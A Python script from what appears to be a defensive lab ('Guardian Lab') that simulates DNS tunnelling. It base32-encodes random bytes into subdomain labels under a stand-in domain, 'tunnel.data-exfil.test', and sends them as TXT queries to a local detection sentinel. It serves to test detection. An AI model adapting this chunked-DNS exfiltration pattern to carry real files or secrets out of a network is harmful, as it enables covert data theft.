"""DNS Tunnelling client simulating data exfiltration over DNS queries."""
from __future__ import annotations

import argparse
import base64
import os
import socket
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from guardian_net.dnswire import TYPE_TXT, make_query


def run_tunnel(
    sentinel_host: str = "127.0.0.1",
    sentinel_port: int = 5353,
    domain_apex: str = "tunnel.data-exfil.test",
    chunks_count: int = 12,
    chunk_size: int = 32,
) -> None:
    print(f"[*] Starting DNS tunnel client targeting sentinel {sentinel_host}:{sentinel_port} under {domain_apex}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2.0)

    for i in range(1, chunks_count + 1):
        # Generate pseudo-random / encrypted chunk of data
        raw_data = os.urandom(chunk_size)
        encoded = base64.b32encode(raw_data).decode("ascii").rstrip("=").lower()
        qname = f"{encoded}.{domain_apex}"

        q = make_query(qname, qtype=TYPE_TXT, msg_id=i)
        try:
            sock.sendto(q.to_wire(), (sentinel_host, sentinel_port))
            resp_data, _ = sock.recvfrom(4096)
            print(f"[+] Tunnel chunk #{i}/{chunks_count} sent: {qname[:30]}... (response: {len(resp_data)} bytes)")
        except Exception as ex:
            print(f"[-] Tunnel chunk #{i} failed: {ex}")
        time.sleep(0.1)

    sock.close()
    print("[✓] DNS tunnel transmission completed.")


def main() -> None:
    parser = argparse.ArgumentParser(description="Guardian Lab DNS Tunnel Client")
    parser.add_argument("--host", default="127.0.0.1", help="DNS Sentinel host")
    parser.add_argument("--port", type=int, default=5353, help="DNS Sentinel port")
    parser.add_argument("--apex", default="tunnel.data-exfil.test", help="Tunnel apex domain")
    parser.add_argument("--chunks", type=int, default=12, help="Number of chunks")
    args = parser.parse_args()

    run_tunnel(
        sentinel_host=args.host,
        sentinel_port=args.port,
        domain_apex=args.apex,
        chunks_count=args.chunks,
    )


if __name__ == "__main__":
    main()
